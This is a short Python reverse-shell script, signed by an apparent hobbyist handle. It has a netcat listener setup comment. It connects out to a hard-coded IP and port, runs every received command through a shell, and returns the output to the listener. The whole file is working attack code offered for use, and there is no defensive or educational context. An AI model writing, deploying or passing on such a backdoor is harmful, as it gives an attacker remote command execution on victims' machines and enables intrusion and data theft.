# a python reverse shell
# set up a netcat listner
# nc -lvp 4444
# tested only on linux
# @hackerman234

import socket
import os
import subprocess

class MySock:
    def connection(self):
        host = "192.168.1.238" # Change this to your IP
        port = 4444            # Change the port if you want to
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))   

    def shell_spawn(self):
        while True:
            commands = self.s.recv(1024)
            cmd = subprocess.Popen(commands, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            self.s.send(cmd.stdout.read())
            self.s.send(cmd.stderr.read())
            
if __name__ == '__main__':
    my_sock = MySock()
    my_sock.connection()
    my_sock.shell_spawn()
